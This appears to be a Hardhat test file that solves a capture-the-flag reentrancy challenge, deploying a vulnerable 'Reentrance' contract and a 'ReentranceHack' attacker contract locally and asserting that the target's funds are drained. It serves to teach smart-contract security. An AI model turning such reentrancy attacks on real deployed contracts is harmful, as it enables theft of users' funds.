// Goal
// Steal all the funds from the contract.

import { ContractFactory, Signer } from "ethers"
import { Reentrance, ReentranceHack } from "../../typechain-types"
import { ethers } from "hardhat"
import { expect } from "chai"

// Solution
describe('Reentrance', () => {
  let Reentrance: ContractFactory
  let reentrance: Reentrance

  let ReentranceHack: ContractFactory
  let reentranceHack: ReentranceHack

  let signers: Signer[]
  let owner: Signer
  let attacker: Signer

  before(async () => {
    signers = await ethers.getSigners()
    owner = signers[0]
    attacker = signers[1]

    Reentrance = await ethers.getContractFactory('Reentrance')
    reentrance = (await Reentrance.deploy()) as Reentrance

    ReentranceHack = await ethers.getContractFactory('ReentranceHack')
    reentranceHack = (await ReentranceHack.deploy(reentrance.address)) as ReentranceHack
  })

  it('Should steal all the funds from the contract', async () => {
    await reentrance.donate(await owner.getAddress(), { value: 5 })

    await reentranceHack.attack({ value: 1 })

    const reentranceBalance = await ethers.provider.getBalance(reentrance.address)
    expect(reentranceBalance).to.be.equal(0)
  })
})